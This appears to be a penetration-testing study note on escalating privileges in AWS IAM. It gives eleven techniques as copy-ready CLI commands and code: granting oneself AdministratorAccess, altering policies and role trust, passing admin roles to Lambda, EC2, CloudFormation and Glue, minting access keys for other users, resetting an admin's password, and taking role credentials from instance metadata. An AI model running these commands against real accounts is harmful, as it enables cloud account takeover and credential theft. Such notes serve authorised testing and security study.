# 01.5 — IAM Privilege Escalation

## What This Note Covers

IAM privilege escalation is the process of using a low-privilege AWS identity to gain higher privileges — ultimately admin. AWS has 25+ documented privilege escalation paths. This note covers the theory, the most impactful techniques with exact commands, and how to scan for them.

---

## The Core Concept

In AWS, privilege escalation doesn't require exploiting a CVE. It requires finding **IAM permissions that allow you to modify your own or others' permissions**, directly or indirectly.

The key insight: **any permission that lets you affect IAM, or lets you execute code as a more-privileged identity, is a potential escalation path.**

> [!tip] The attacker's question
> For every permission you have, ask: "Can this permission — alone or combined with others — let me do something that grants me more permissions?"

Before manually reviewing permissions, run automated tools:

## Technique 1: CreatePolicyVersion (Set as Default)

**Permissions needed:** `iam:CreatePolicyVersion`

If you can create a new version of an existing customer-managed policy, you can replace it with one that grants you `AdministratorAccess`, then set it as the default.

```bash
# Step 1: Find a policy you have permission to modify
aws iam list-policies --scope Local

# Step 2: Create a new version with admin permissions
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }' \
  --set-as-default

# You now have AdministratorAccess via that policy
aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
```

## Technique 2: AttachUserPolicy / AttachRolePolicy / AttachGroupPolicy

**Permissions needed:** `iam:AttachUserPolicy` (or role/group variants)

Directly attach the AWS-managed `AdministratorAccess` policy to yourself.

```bash
# Attach AdministratorAccess to your own user
aws iam attach-user-policy \
  --user-name YOUR_USERNAME \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Attach to a role you can assume
aws iam attach-role-policy \
  --role-name TARGET_ROLE \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Then assume the now-privileged role
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/TARGET_ROLE \
  --role-session-name privesc
```

## Technique 3: PutUserPolicy / PutRolePolicy / PutGroupPolicy (Inline Policies)

**Permissions needed:** `iam:PutUserPolicy` (or role/group variant)

Create or overwrite an inline policy on yourself granting admin.

```bash
# Add an inline policy to your own user
aws iam put-user-policy \
  --user-name YOUR_USERNAME \
  --policy-name AdminEscalation \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }'
```

## Technique 4: AddUserToGroup

**Permissions needed:** `iam:AddUserToGroup`

If a group has admin permissions, add yourself to it.

```bash
# List groups and their policies to find a privileged group
aws iam list-groups
aws iam list-attached-group-policies --group-name Administrators

# Add yourself to an admin group
aws iam add-user-to-group \
  --group-name Administrators \
  --user-name YOUR_USERNAME
```

## Technique 5: UpdateAssumeRolePolicy (Modify Trust Policy)

**Permissions needed:** `iam:UpdateAssumeRolePolicy`

Modify a role's trust policy to allow your identity to assume it.

```bash
# Find roles with powerful permissions but restrictive trust policies
aws iam list-roles

# Modify a powerful role's trust policy to trust your identity
aws iam update-assume-role-policy \
  --role-name AdminRole \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::123456789012:user/YOUR_USERNAME"
      },
      "Action": "sts:AssumeRole"
    }]
  }'

# Now assume the role
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/AdminRole \
  --role-session-name privesc
```

## Technique 6: iam:PassRole + Lambda (Create Function + Invoke)

**Permissions needed:** `iam:PassRole`, `lambda:CreateFunction`, `lambda:InvokeFunction`

Create a Lambda function, pass it an admin IAM role as its execution role, then invoke it to execute code as that role.

```bash
# Step 1: Create a Lambda function with an admin execution role
# The function code will call iam:AttachUserPolicy to escalate
cat > /tmp/lambda_privesc.py << 'EOF'
import boto3

def handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user_policy(
        UserName='YOUR_USERNAME',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return "Escalated"
EOF

zip /tmp/lambda_privesc.zip /tmp/lambda_privesc.py

# Step 2: Create the function with the admin role
aws lambda create-function \
  --function-name privesc-function \
  --runtime python3.11 \
  --role arn:aws:iam::123456789012:role/AdminRole \
  --handler lambda_privesc.handler \
  --zip-file fileb:///tmp/lambda_privesc.zip

# Step 3: Invoke the function
aws lambda invoke \
  --function-name privesc-function \
  /tmp/output.txt

# Your user now has AdministratorAccess
aws iam list-attached-user-policies --user-name YOUR_USERNAME
```

## Technique 7: iam:PassRole + EC2 (Instance Profile)

**Permissions needed:** `iam:PassRole`, `ec2:RunInstances`, access to the instance (SSH or SSM)

Launch an EC2 instance with an admin IAM role attached as the instance profile. Then access the instance and steal the role's temporary credentials from the metadata service.

```bash
# Step 1: Launch an EC2 instance with the target admin role
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t2.micro \
  --iam-instance-profile Name=AdminInstanceProfile \
  --key-name YOUR_KEY_PAIR \
  --security-group-ids sg-0abc123

# Step 2: SSH into the instance (or use SSM if available)
ssh -i key.pem ec2-user@INSTANCE_PUBLIC_IP

# Step 3: Steal the admin role credentials from metadata
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole

# Use the credentials outside of the instance
```

## Technique 8: iam:PassRole + CloudFormation

**Permissions needed:** `iam:PassRole`, `cloudformation:CreateStack`

Create a CloudFormation stack that passes an admin role. CloudFormation executes as that role, and you can have it perform IAM actions on your behalf.

```bash
# Create a CloudFormation template that attaches admin policy to your user
cat > /tmp/privesc-stack.json << 'EOF'
{
  "AWSTemplateFormatVersion": "2010-09-09",
  "Resources": {
    "PrivEsc": {
      "Type": "AWS::IAM::Policy",
      "Properties": {
        "PolicyName": "AdminPolicy",
        "PolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
        },
        "Users": ["YOUR_USERNAME"]
      }
    }
  }
}
EOF

# Deploy the stack with the admin role
aws cloudformation create-stack \
  --stack-name privesc-stack \
  --template-body file:///tmp/privesc-stack.json \
  --role-arn arn:aws:iam::123456789012:role/AdminRole \
  --capabilities CAPABILITY_NAMED_IAM
```

## Technique 9: CreateAccessKey (For Another User)

**Permissions needed:** `iam:CreateAccessKey`

Create a new access key for another IAM user (who has more privileges than you).

```bash
# List users to find a privileged one
aws iam list-users

# Create an access key for that user
aws iam create-access-key --user-name admin-user

# Returns:
{
    "AccessKey": {
        "UserName": "admin-user",
        "AccessKeyId": "AKIA...",
        "SecretAccessKey": "...",
        "Status": "Active"
    }
}

# Use the new key pair
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
aws sts get-caller-identity
```

## Technique 10: UpdateLoginProfile (Console Access)

**Permissions needed:** `iam:UpdateLoginProfile`

If a privileged IAM user has console access, you can reset their password and log in as them.

```bash
# Reset the password for a privileged user
aws iam update-login-profile \
  --user-name admin-user \
  --password 'NewPassword123!'

# Log into the AWS console as admin-user
# URL: https://ACCOUNT_ID.signin.aws.amazon.com/console
```

## Technique 11: iam:PassRole + Glue (CreateJob)

**Permissions needed:** `iam:PassRole`, `glue:CreateJob`, `glue:StartJobRun`

AWS Glue is a data integration service. Create a Glue job with an admin role and execute arbitrary Python code as that role.

```bash
# Create a Glue job that escalates privileges
aws glue create-job \
  --name privesc-job \
  --role arn:aws:iam::123456789012:role/AdminRole \
  --command '{
    "Name": "glueetl",
    "ScriptLocation": "s3://your-bucket/privesc_script.py"
  }'

# Start the job
aws glue start-job-run --job-name privesc-job

# The script runs as the AdminRole and can perform IAM actions
```

## Quick Reference — Privesc Workflow

```bash
# 1. Enumerate your permissions
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)
aws iam list-user-policies --user-name USERNAME

# 2. Automated scan
python3 pacu.py → run iam__privesc_scan

# 3. Try the easiest techniques first (direct IAM modify)
aws iam attach-user-policy --user-name USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam put-user-policy --user-name USERNAME --policy-name Admin --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

# 4. Confirm escalation
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name USERNAME
```
